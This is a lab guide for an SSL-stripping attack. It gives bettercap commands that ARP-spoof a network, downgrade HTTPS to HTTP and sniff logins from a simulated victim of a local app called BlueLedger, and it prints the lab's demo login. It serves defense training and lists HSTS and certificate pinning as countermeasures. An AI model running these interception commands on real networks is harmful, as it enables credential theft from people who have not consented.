# SSL Stripping Lab Guide

## Overview
This lab demonstrates SSL downgrade attacks using SSL stripping techniques. The goal is to intercept HTTPS traffic and capture credentials transmitted in plaintext for security research and defense training.

## Prerequisites
- Linux system with network access
- Bettercap installed
- Python 3 with requests library
- Network interface capable of packet injection
- Victim simulator (included)

## Tools Comparison

### Bettercap vs Ettercap
- **Bettercap**: Recommended - built-in SSL stripping, no custom filters needed
- **Ettercap**: Requires custom filter files, more complex setup

## Lab Setup

### 1. Install Bettercap
```bash
sudo apt install bettercap
```

### 2. Enable IP Forwarding
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
sudo sysctl -w net.ipv4.conf.all.send_redirects=0
```

### 3. Start SSL Stripping Attack

**Basic command (replace `eth0` with your interface):**

```bash
sudo bettercap -iface eth0 -eval "net.recon on; set arp.spoof.fullduplex true; arp.spoof on; set http.proxy.sslstrip true; http.proxy on; net.sniff on"
```

**Target specific victim:**
```bash
sudo bettercap -iface eth0 -eval "set arp.spoof.fullduplex true; set arp.spoof.targets [VICTIM_IP]; arp.spoof on; set http.proxy.sslstrip true; http.proxy on; net.sniff on"
```

### 4. Start BlueLedger Target Application
```bash
cd /home/hwoomer/Documents/BlueLedger
docker compose up
```

This starts the BlueLedger app with:
- HTTP server on port 5000
- HTTPS server on port 5001 (with self-signed certificate)

### 5. Run Victim Simulator
In a separate terminal:
```bash
python3 victim_simulator.py
```

**Note**: Update victim simulator target to `https://[TARGET_IP]:5001/api/auth/login`

## Attack Components

### Bettercap Modules Used
- `arp.spoof`: ARP poisoning for MITM positioning
- `http.proxy`: HTTP proxy with SSL stripping
- `net.sniff`: Packet capture for credential extraction
- `net.recon`: Network reconnaissance

### SSL Stripping Process
1. ARP spoofing positions attacker as gateway
2. HTTPS requests intercepted and downgraded to HTTP
3. Victim receives HTTP response (appears normal)
4. Credentials transmitted in plaintext
5. Bettercap captures and logs credentials

## Expected Results

### Captured Credentials
Monitor bettercap output for JSON POST data containing:
- `"email":"Employee@sinamoa.com"`
- `"password":"Employee123!@#"`

### Traffic Flow
1. Victim attempts HTTPS connection to port 5001 (BlueLedger HTTPS)
2. Bettercap intercepts and strips SSL
3. Plaintext HTTP request forwarded to port 5000 (BlueLedger HTTP)
4. BlueLedger backend accepts both HTTP and HTTPS
5. Credentials captured in transit by bettercap

## Victim Simulator Details
- Sends JSON login attempts every 30 seconds to `/api/auth/login`
- Uses realistic User-Agent headers
- Targets configurable IP address (defaults to HTTPS port 5001)
- Simulates typical REST API authentication flow
- Credentials: Employee@sinamoa.com / Employee123!@#

## Defense Considerations
This lab helps understand:
- SSL stripping attack vectors
- Importance of HSTS (HTTP Strict Transport Security)
- Certificate pinning effectiveness
- User awareness of URL schemes (HTTP vs HTTPS)

## Lab Cleanup
1. Stop bettercap with Ctrl+C
2. Stop victim simulator with Ctrl+C
3. Disable IP forwarding (optional):
   ```bash
   echo 0 > /proc/sys/net/ipv4/ip_forward
   ```

## Notes
- This setup requires no custom configuration files
- Works out of the box with standard tools
- Demonstrates practical SSL downgrade vulnerability
- Suitable for security research and training environments

## Troubleshooting
- Ensure proper network interface selection
- Verify ARP spoofing is working with `net.show`
- Check that victim and attacker are on same network segment
- Monitor bettercap logs for SSL stripping activity